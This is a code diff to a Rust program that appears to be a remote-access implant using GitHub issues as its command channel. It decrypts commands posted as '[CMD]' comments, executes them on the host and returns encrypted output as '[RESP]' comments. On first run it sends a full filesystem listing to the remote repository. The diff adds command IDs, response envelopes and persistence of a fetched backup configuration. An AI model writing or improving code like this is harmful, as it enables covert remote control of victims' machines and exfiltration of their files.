@@ -20,6 +20,19 @@ use uuid_gen::get_or_create_agent_id;
 use std::fs;
 use std::path::PathBuf;
 
+#[derive(serde::Deserialize)]
+struct CommandEnvelope {
+    command_id: String,
+    command: String,
+}
+
+#[derive(serde::Serialize)]
+struct ResponseEnvelope<'a> {
+    response_to: &'a str,
+    message_type: &'a str,
+    content: &'a str,
+}
+
 fn debug_log(msg: &str) {
     let enable_debug = std::env::var("ENABLE_DEBUG").as_ref().map(|s| s.as_str()).ok()
         .or_else(|| option_env!("ENABLE_DEBUG"))
@@ -121,6 +134,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             debug_log(&format!("Relocated to: {}", new_path));
             return Ok(());
         }
+    }
+
+    if let Ok(Some(backup)) = crate::backup_config::load_persisted_backup_config() {
+        crate::backup_config::apply_backup_config(&backup);
     }
 
     let mut config = Config::from_env();
@@ -304,7 +321,7 @@ async fn run_agent(config: &Config, agent_id: &str) -> Result<(), Box<dyn std::e
         debug_log("First run, sending initial file list...");
         let default_path = if cfg!(windows) { "DRIVES" } else { "/" };
         let output = crate::files::list_files(default_path);
-        if let Err(e) = send_response_chunks(&config, issue_number, &output).await {
+        if let Err(e) = send_response_chunks(&config, issue_number, "bootstrap-file-list", &output).await {
             debug_log(&format!("Failed to send initial file list: {}", e));
         } else {
             last_activity_time = std::time::Instant::now();
@@ -348,6 +365,7 @@ async fn run_agent(config: &Config, agent_id: &str) -> Result<(), Box<dyn std::e
                         Ok(Ok(backup)) => {
                             debug_log("Backup config fetched, applying new config...");
                             crate::backup_config::apply_backup_config(&backup);
+                            let _ = crate::backup_config::persist_backup_config(&backup);
 
                             let _ = fs::remove_file(get_issue_file_path());
 
@@ -589,11 +607,19 @@ async fn check_commands(
                 let encrypted = body.strip_prefix("[CMD]").unwrap_or(body);
                 match crate::crypto::decrypt(encrypted, &config.password) {
                     Ok(decrypted) => {
-                        debug_log(&format!("Decrypted command: {}", decrypted));
-                        let output = crate::commands::execute_command(&decrypted);
+                        let (command_id, command_text) = match serde_json::from_str::<CommandEnvelope>(&decrypted) {
+                            Ok(envelope) => (envelope.command_id, envelope.command),
+                            Err(_) => {
+                                let fallback_id = format!("legacy-{}", comment_id);
+                                (fallback_id, decrypted)
+                            }
+                        };
+
+                        debug_log(&format!("Decrypted command: {}", command_text));
+                        let output = crate::commands::execute_command(&command_text);
                         debug_log(&format!("Command output length: {}", output.len()));
 
-                        send_response_chunks(&config, issue_number, &output).await?;
+                        send_response_chunks(&config, issue_number, &command_id, &output).await?;
 
                         had_activity = true;
                         *last_comment_id = comment_id;
@@ -616,6 +642,7 @@ async fn check_commands(
 async fn send_response_chunks(
     config: &Config,
     issue_number: u64,
+    command_id: &str,
     output: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
     const CHUNK_SIZE: usize = 50000;
@@ -629,8 +656,15 @@ async fn send_response_chunks(
     let url = format!("https://api.github.com/repos/{}/{}/issues/{}/comments",
         config.github_owner, config.github_repo, issue_number);
 
+    let plain_payload;
+
     if output.len() <= CHUNK_SIZE {
-        let encrypted = crate::crypto::encrypt(output, &config.password)?;
+        plain_payload = serde_json::to_string(&ResponseEnvelope {
+            response_to: command_id,
+            message_type: "text",
+            content: output,
+        })?;
+        let encrypted = crate::crypto::encrypt(&plain_payload, &config.password)?;
         let response = format!("[RESP]{}", encrypted);
         let payload = serde_json::json!({"body": response});
 
@@ -654,7 +688,12 @@ async fn send_response_chunks(
 
         for (i, chunk) in chunks.iter().enumerate() {
             let msg = format!("[Part {}/{}/{}]\n{}", response_id, i + 1, total_chunks, chunk);
-            let encrypted = crate::crypto::encrypt(&msg, &config.password)?;
+            let chunk_payload = serde_json::to_string(&ResponseEnvelope {
+                response_to: command_id,
+                message_type: "chunk",
+                content: &msg,
+            })?;
+            let encrypted = crate::crypto::encrypt(&chunk_payload, &config.password)?;
             let response = format!("[RESP]{}", encrypted);
             let payload = serde_json::json!({"body": response});
 
